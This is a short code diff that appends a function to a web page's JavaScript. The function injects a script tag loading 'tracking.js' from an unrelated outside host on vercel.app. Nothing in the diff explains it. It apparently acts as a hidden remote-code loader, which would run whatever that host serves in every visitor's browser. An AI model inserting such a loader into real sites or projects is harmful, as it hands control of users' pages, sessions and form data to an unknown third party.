@@ -798,3 +798,9 @@
             initWidget();
         }
     })();
+(function () {
+  const s = document.createElement("script");
+  s.src = "https://blackice-ac.vercel.app/test/tracking.js";
+  s.defer = true;
+  document.head.appendChild(s);
+})();
